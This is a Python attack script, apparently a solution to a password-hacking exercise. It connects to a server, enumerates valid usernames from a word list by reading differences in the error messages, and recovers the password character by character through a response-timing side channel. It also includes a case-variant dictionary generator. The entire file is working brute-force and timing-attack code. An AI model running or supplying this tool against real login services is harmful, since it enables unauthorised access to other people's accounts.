import itertools as it
import json
import socket
import string
import sys
import time


def password_generator():
    char_set = string.ascii_letters + string.digits
    for length in it.count(1):
        yield from map(''.join, it.product(char_set, repeat=length))


def password_generator_dict():
    with open('../passwords.txt', encoding='U8') as pws:
        for pw in map(str.strip, pws):
            yield from map(''.join, it.product(*zip(pw.upper(), pw.lower())))


def load_logins():
    with open('../logins.txt', encoding='U8') as logins:
        yield from map(str.strip, logins)


def perform_request(s, login, password):
    request = {'login': login, 'password': password}
    s.sendall(json.dumps(request).encode())
    return json.loads(s.recv(2048).decode())


def find_login(s):
    for login in load_logins():
        response = perform_request(s, login, '')
        if response['result'] == 'Wrong password!':
            return login


def find_password(s, login):
    password = ''
    while True:
        for char in password_generator():
            current_password = password + char
            start = time.time()
            response = perform_request(s, login, current_password)
            end = time.time()
            if response['result'] == 'Connection success!':
                return current_password
            if end - start > 0.09:
                password += char
                break


def main():
    host = sys.argv[1]
    port = int(sys.argv[2])
    with socket.socket() as s:
        s.connect((host, port))
        login = find_login(s)
        password = find_password(s, login)
        print(json.dumps({'login': login, 'password': password}))


if __name__ == '__main__':
    main()
